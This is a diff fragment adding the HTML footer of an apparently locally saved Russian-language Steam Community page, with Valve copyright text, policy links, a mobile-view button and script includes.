+			<span id="footerLogo"><img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/footerLogo_valve.png" width="96" height="26" border="0" alt="Логотип Valve"></span>
+			<span id="footerText">
+				© Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах. Часть географических сведений на этом сайте предоставлена <a href="../../steamcommunity.com/linkfilter/index.html%3Furl=http:%252F%252Fwww.geonames.org.html" target="_blank" rel="noreferrer">geonames.org</a>.				<br>
+									<span class="valve_links">
+						<a href="../../store.steampowered.com/privacy_agreement/index.html" target="_blank">Privacy Policy</a>
+						&nbsp; | &nbsp;<a href="../../www.valvesoftware.com/legal.htm" target="_blank">Legal</a>
+						&nbsp;| &nbsp;<a href="../../store.steampowered.com/subscriber_agreement/index.html" target="_blank">Steam Subscriber Agreement</a>
+					</span>
+							</span>
+		</div>
+					<div class="responsive_optin_link">
+				<div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
+					<span>Мобильная версия</span>
+				</div>
+			</div>
+			</div>
+	
+	</div>	<!-- responsive_page_content -->
+
+</div>	<!-- responsive_page_frame -->
+</body>
+<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/steam.js"></script>
+</html>
